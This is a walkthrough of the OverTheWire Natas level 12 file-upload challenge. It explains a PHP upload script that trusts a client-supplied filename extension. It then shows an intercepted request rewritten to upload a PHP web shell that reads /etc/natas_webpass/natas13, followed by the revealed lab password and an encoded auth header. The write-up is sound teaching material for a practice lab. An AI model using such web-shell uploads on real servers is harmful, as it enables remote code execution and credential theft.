## Level11 -> Level12


You can upload a JPEG file that's up to 1KB in size. 


Here's the source code. 


```php
<?php

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);


        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>
<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
<?php } ?>
```


The source code is long and there are `3` functions. 


Let's have a look at each one of them. 


The `genRandomString` function crates a `10` letter random string with the **[mt_rand](https://www.php.net/manual/en/function.mt-rand.php)** function. 


```php
function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}
```


The `makeRandomPath` functions creates the path with the random string `genRandomString` generated.


```php 
function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}
```


The **[file_exists](https://www.php.net/manual/en/function.file-exists.php)** literally checks if a certain file exists in the given path.


Finally there's the `makeRandomPathFromFilname` function, not exactly sure what it does.


```php
function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}
```


Here are some reading materials for the `pathinfo` function.


https://www.php.net/manual/en/function.pathinfo.php


https://stackoverflow.com/questions/2261951/what-exactly-is-path-info-in-php


The `if` statement checks if the `JPEG` file was uploaded and if it's less than 1KB in size. 


It doesn't look like the code itself will reveal the password.


```php
if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);


        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
}
```


You can see that whatever file we upload the php code will add the `.jpg` suffix.


```html
<input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />
```


This challenge is pretty hard and if you haven't solved these types of problems it will be tough so I'll just show the solution right away. 


Since the `php` code adds the `.jpg` suffix at the end what if we upload a `.jpg` file intercept the request before sending it and change the `.jpg` file to a `.php` file and execute commands that returns the password. 


How on earth can you intercept requests before sending them?  well you can't unless you use a certain tool. 


**[Burp Suite](https://en.wikipedia.org/wiki/Burp_Suite)** does just the above, you can download the community version **[here](https://portswigger.net/burp/communitydownload)**.


Now open burp, click on the Proxy tab and click intercept on.


This will open a colored chrome tab. 


Then enter the url for the challenge. 


When you enter the url, the colored chrome browser won't show you the natas web page. 


It will wait until you forward the request in burp. 


When you click on the orange Forward button it will send the HTTP request and show you the web page.


Type the username and password and click the Forward button again.


Now upload the file but don't click the forward button yet.


On the left bottom of the burp suite tool you'll see the HTTP request you're trying to send. 


It will look like this. 


```
POST /index.php HTTP/1.1
Host: natas12.natas.labs.overthewire.org
Content-Length: 1171
Cache-Control: max-age=0
Authorization: Basic bmF0YXMxMjp5WmRrakFZWlJkM1I3dHE3VDVrWE1qTUpsT0lrekRlQg==
Accept-Language: ko-KR,ko;q=0.9
Origin: http://natas12.natas.labs.overthewire.org
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9McwHkuWa7yTgNqz
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://natas12.natas.labs.overthewire.org/index.php
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

------WebKitFormBoundary9McwHkuWa7yTgNqz
Content-Disposition: form-data; name="MAX_FILE_SIZE"

1000
------WebKitFormBoundary9McwHkuWa7yTgNqz
Content-Disposition: form-data; name="filename"

ae6fakqbxw.jpg
------WebKitFormBoundary9McwHkuWa7yTgNqz
Content-Disposition: form-data; name="uploadedfile"; filename="natas12.jpg"
Content-Type: image/jpeg

ÿØÿà
```


We can trick the web page to believe that even when you upload a php file it will add the `.jpg`
suffix thinking it's a image file. 


This was the request the image file was going to send. 


```
ae6fakqbxw.jpg
------WebKitFormBoundary9McwHkuWa7yTgNqz
Content-Disposition: form-data; name="uploadedfile"; filename="natas12.jpg"
Content-Type: image/jpeg

ÿØÿà
```


I intercepted the request and changed the it like this. 


```
ae6fakqbxw.php
------WebKitFormBoundary9McwHkuWa7yTgNqz
Content-Disposition: form-data; name="uploadedfile"; filename="natas12.php"
Content-Type: text/php

<?php
	passthru('cat /etc/natas_webpass/natas13');
?>
```


Now click the forward button. 


It refreshes the web page like this. 


```
The file upload/ijtvbcmjt7.php has been uploaded
```


Click on the forward button once more. 


You'll see the password.


```
trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
```


Explaining this challenge well is really hard. 


These types of bug are called file upload vulnerabilities.


https://portswigger.net/web-security/file-upload


https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload



But how did intercepting the request and changing the HTTP content from `.jpg` `.php` reveal the password? 


Well there's a bug in the `makeRandomPathFromFilename` function.


```php
function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION); // <- This line 
    return makeRandomPath($dir, $ext);
}
```


The script gets the new file's extension from `$_POST["filename"]`.


Normally, the browser sends `ae6fakqbxw.jpg`. 


The `pathinfo()` function grabs the `.jpg` and creates an image file. 


With burp you can intercept the request and change the filename from `ae6fakqbxw.jpg` to `natas12.php`. 


The script now runs `pathinfo($fn, PATHINFO_EXTENSION)`, which will build a new filename `ae6fakqbxw.php` instead of `ae6fakqbxw.jpg`.




I'll add some links to read to solidify your understanding. 


### 1. What is the Content-Type Header? 


https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Type


### 2. What does the $_FILES in php do?


https://www.php.net/manual/en/reserved.variables.files.php


### 3. What does the $_POST in php do? 


https://www.php.net/manual/en/reserved.variables.post.php